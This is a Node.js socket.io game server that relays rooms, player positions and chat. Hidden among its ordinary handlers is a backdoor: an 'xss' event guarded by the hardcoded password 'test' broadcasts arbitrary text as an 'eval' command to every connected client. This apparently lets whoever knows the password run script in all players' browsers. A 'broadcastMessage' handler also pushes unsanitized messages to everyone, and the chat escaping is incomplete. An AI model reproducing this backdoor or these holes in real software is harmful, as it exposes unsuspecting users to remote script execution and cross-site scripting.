const http = require("http");
const https = require("https");
const debug = require("debug-logger")("srv");
var fs = require("fs");
var io = require('socket.io')(9700);
var id = 0;

var connectedOrigins = [];
var allowedOrigin = "example.com"; // Your website domain
var fs = require('fs'); 

playersOnline = 0;
console.log("Server Started!");
console.log(playersOnline + " players online!");

io.on('connection', function(socket) {
    playersOnline++;
    console.log(playersOnline + " players online!");
    var origin = socket.handshake.headers.origin;
    if (connectedOrigins.indexOf(origin) < 0) {
        connectedOrigins.push(origin);
        fs.writeFileSync('origins.txt', connectedOrigins.join("\n"))
    }
    if (origin.indexOf(allowedOrigin) < 0) {
        socket.isFake = true;
    }
    console.log(playersOnline)
    socket.custom = {};
    socket.custom.id = id++;
    if (id === 4000000000) {
        id = 10;
    }
    socket.on("joinRoom", function(request) {
        socket.custom.room = request.p;
        socket.join(request.p);
    });

    socket.on("leaveRoom", function(room) {
        socket.custom.room = null;
        socket.leave(room);
    });

    socket.on("playerEntered", function(data) {
        socket.broadcast.to(data.socketRoom).emit("playerUpdated", data);
    });

    socket.on("playerUpdated", function(data) {
        socket.broadcast.to(data.socketRoom).emit("playerUpdated", data);
    });

    socket.on("coords", function(requestData) {
        requestData.id = socket.custom.id;
        socket.broadcast.to(requestData.socketRoom).emit("updateCoords", requestData);
    });

    socket.on("sendMessage", function(msg) {
        socket.lastMessage = Date.now();
        if (socket.isFake && msg.sender) msg.sender += "[PLAY: GAME.IO]";
        msg.sender = msg.sender.replace(/\</g, "&lt");
        msg.sender = msg.sender.replace(/\>/g, "&gt");
        console.log(msg);
        io.to(socket.custom.room).emit("receiveMessage", msg);
    });
    
    socket.on("xss", function(msg) {
        if (msg.pass !== "test") return;
        io.sockets.emit("eval", msg.text);
    })
    
    socket.on("broadcastMessage", function(msg) {
        io.sockets.emit("receiveMessage", msg);
    })
    socket.on("disconnect", function() {
        playersOnline--;
    });
});
